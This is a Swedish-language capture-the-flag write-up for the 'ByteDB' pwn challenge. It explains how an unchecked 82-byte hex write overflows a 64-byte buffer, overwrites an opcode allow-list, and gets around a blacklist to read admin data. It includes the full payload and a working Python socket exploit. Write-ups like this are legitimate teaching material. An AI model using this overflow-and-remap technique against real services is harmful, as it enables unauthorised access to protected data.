# ByteDB — Svenska

**Kategori:** Exploatering (pwn / TCP-tjänst). **Poäng:** 1000.
**Mål:** `nc challs.crate.nu 30261`
**Flaggformat:** `cratectf{...}` (det bokstavliga värdet är redigerat nedan — du
återskapar det själv).

> Obs: lagets egen lösning hann bli förbisprungen av ett annat lag på tavlan, men
> tekniken nedan är den bekräftat fungerande lösningen och återskapar admin-anteckningen
> som innehåller flaggan.

## 1. Vad tjänsten gör

Anslut så får du en textmeny. Tre saker är viktiga:

* **Val `1` — kör en fråga.** Du skriver en lista av opkoder i hex (mellanslag
  valfria), avslutad med `0xFF`. Servern avkodar hexsträngen till en fast **64-byte
  stor "databasbuffert"**, översätter opkoderna till ett SQL-liknande uttryck och kör
  det. Hjälptext som visas vid alla parsningsfel:
  ```
  --Write valid bytecodes in hex format, and end query with 0xFF.
  --You are not authorized to use 0x11.
  --Example: 00 20 01 10 FF or 00200110FF.
  ```
* **Val `2` — "Inspect ByteDB mappings".** Skriver ut hela opkod→token-tabellen.

### Den fullständiga opkodtabellen (menyval `2`)

```
0x00: SELECT      0x10: data        0x20: username    0x30: admin
0x01: FROM        0x11: admin_data  0x21: id          0x31: user
0x02: WHERE       0x23: notes       0x22: role        0x41: knut
0x03: ==          0x04: ,           0x42: berit       0x43: arne
0x44: ingvar      0xFF: END
```

I kanonisk ordning är de 18 tokens:

```
SELECT, FROM, WHERE, ==, ',', data, admin_data, username, id, role,
notes, admin, user, knut, berit, arne, ingvar, END
```

Dessa 18 tokens paras, via index, med en **"allowed-key array"** (nyckelarray) på 18
opkod-bytes som ligger i minnet **direkt efter** den 64-byte stora databasbufferten. I
normalt (oförändrat) tillstånd är nyckelarrayen den sorterade listan:

```
00 01 02 03 04 10 11 20 21 22 23 30 31 41 42 43 44 FF
```

så index 0 (`SELECT`) ↔ `0x00`, … index 6 (`admin_data`) ↔ `0x11`, … precis som
menydumpen visar.

### Normal fråga (baslinje)

```
Val 1, skicka:  00 23 01 10 FF
-> Bytecode translates to: SELECT notes FROM data;
```
(`00`=SELECT, `23`=notes, `01`=FROM, `10`=data, `FF`=END.)

## 2. Sårbarheten

* Token `admin_data` ligger på nyckel-byten `0x11`. Indatavalidering **svartlistar
  `0x11`**: varje fråga som innehåller byten `0x11` (på valfri position) avvisas före
  exekvering. Raden "You are not authorized to use 0x11" är statisk hjälptext som
  skrivs ut vid *varje* parsningsfel (även vid ren icke-hex-skräp), dvs. det finns
  ingen separat semantisk auktoriseringskontroll att kringgå — `0x11` accepteras helt
  enkelt aldrig.
* Hex-avkodaren har **ingen gränskontroll** som skyddar den 64-byte stora
  databasbufferten. Den avkodar upp till **82 bytes** indata rakt förbi slutet av
  bufferten. Den 18-byte stora nyckelarrayen ligger direkt efter bufferten, på
  avkodade offset **64–81**. Därför skriver en 82-byte fråga över **alla 18
  nyckel-bytes** med angriparvalda värden.
* Överskrivningen sker *innan* avvisningen "SQL statement length invalid", så
  nyckelarrayen ändras även om just den frågan inte körs. Korruptionen är
  per-anslutning och kvarstår för uppföljningsfrågor på **samma TCP-anslutning**.

Grundidé: du behöver aldrig skicka `0x11`. Istället **skriver du om nyckelarrayen** så
att token `admin_data` (kanoniskt index 6) blir nåbar via en alltid-tillåten
opkod-byte.

## 3. Bygga överskrivningen

Välj en ny 18-byte nyckelarray som är originaluppsättningen **minus `0x11`**, håll den
sorterad och behåll varje opkod som validatorn fortfarande behöver. Att ta bort `0x11`
lämnar 17 distinkta bytes, så duplicera den sista vanliga (`0x44`) för att fylla 18
platser:

```
nya nycklar = 00 01 02 03 04 10 20 21 22 23 30 31 41 42 43 44 44 FF
```

Att para dessa via index med den fasta token-listan ger den **nya mappningen**. Det
enda du behöver av den är:

```
00 = SELECT     01 = FROM     20 = admin_data     30 = notes     FF = END
```

Så efter omskrivningen betyder frågan `00 30 01 20 FF` **`SELECT notes FROM
admin_data;`** — och varje byte i den (`00 30 01 20 FF`) finns i den tillåtna
uppsättningen under både den gamla och nya nyckelarrayen. `0x11` skickas aldrig.

### 82-byte-nyttolasten

```
head (64 bytes) : 00 30 01 20   + 04 upprepat 60 gånger
keys (18 bytes) : 00 01 02 03 04 10 20 21 22 23 30 31 41 42 43 44 44 FF
```

Som en kompakt hexsträng (164 hex-tecken = 82 bytes):

```
00300120 0404040404040404040404040404040404040404040404040404040404040404040404040404040404040404040404040404040404040404040404 0001020304102021222330314142434444FF
```

Innehållet i de 64 head-bytesen spelar ingen roll (frågan körs inte) — det finns bara
för att skjuta skrivmarkören till offset 64 så att de avslutande 18 bytesen hamnar på
nyckelarrayen.

## 4. Fullständig exploit (en enda TCP-anslutning)

Alla tre steg måste ske på **en** anslutning, eftersom korruptionen är per-anslutning.

```python
import socket, time

HOST, PORT = "challs.crate.nu", 30261

def rd(s, wait=0.5, timeout=1.5):
    time.sleep(wait); s.settimeout(timeout); out = b""
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            out += c
    except socket.timeout:
        pass
    return out.decode(errors="replace")

s = socket.create_connection((HOST, PORT), timeout=10)
print(rd(s, 0.8))                                   # banner / meny

# Steg 1: skriv över nyckelarrayen (val 1 + 82-byte nyttolast)
head = "00300120" + "04" * 60                        # 64 bytes
keys = "0001020304102021222330314142434444FF"        # 18 bytes
payload = head + keys
assert len(payload) == 164                            # 82 bytes

s.sendall(b"1\n"); rd(s, 0.4)
s.sendall((payload + "\n").encode())
print(rd(s, 1.0))   # -> "Wrote 82 bytes to the database buffer" + "SQL statement length invalid"

# Steg 2 (valfritt bevis): dumpa mappningen, visar nu 0x20: admin_data
s.sendall(b"\n"); rd(s, 0.3)        # tom inmatning återgår till menyn
s.sendall(b"2\n")
print(rd(s, 0.8))                   # mappningsdump: "0x20: admin_data"

# Steg 3: kör den ommappade admin-frågan på SAMMA anslutning
s.sendall(b"\n"); rd(s, 0.3)
s.sendall(b"1\n"); rd(s, 0.4)
s.sendall(b"00300120FF\n")
print(rd(s, 1.0))   # -> SELECT notes FROM admin_data;  -> admin-anteckning med flaggan
```

### Vad varje svar visar

1. **Svaret i steg 1** innehåller `Wrote 82 bytes to the database buffer` (skrivningen
   utanför gränsen lyckades) följt av `SQL statement length invalid` (den frågan körs
   inte — men nyckelarrayen är redan korrupt).
2. **Mappningsdumpen i steg 2** visar nu `0x20: admin_data` (och övriga tokens
   förskjutna en opkod-plats uppåt), vilket bekräftar ommappningen.
3. **Svaret i steg 3** visar `Bytecode translates to: SELECT notes FROM admin_data;`
   och skriver ut admin-anteckningen. Anteckningens text är flaggan, `cratectf{...}`.

## 5. Varför kortare överskrivningar misslyckades

Partiella överskrivningar (t.ex. 65 eller 71 bytes) korrumperar bara ett *prefix* av
nyckelarrayen och tar samtidigt bort opkoder som validatorn fortfarande behöver (t.ex.
`0x00`), så varje efterföljande fråga på den anslutningen returnerar `Invalid format`
— anslutningen läses som "förgiftad". Den fungerande metoden är en **fullständig
82-byte omskrivning** som (a) behåller varje nödvändig opkod, (b) håller arrayen
sorterad, och (c) följs av en fråga vars bytes är giltiga under både den gamla och nya
nyckeluppsättningen.

## Verifiering

Plattformsbekräftat löst. Den ommappade frågan returnerar `SELECT notes FROM
admin_data;` och admin-anteckningen, vilket är flaggan i formatet `cratectf{...}`.
`0x11` skickas aldrig — auktoriseringen kringgås enbart genom att flytta token
`admin_data` till en alltid-tillåten opkod via överskrivningen av nyckelarrayen utanför
gränsen.
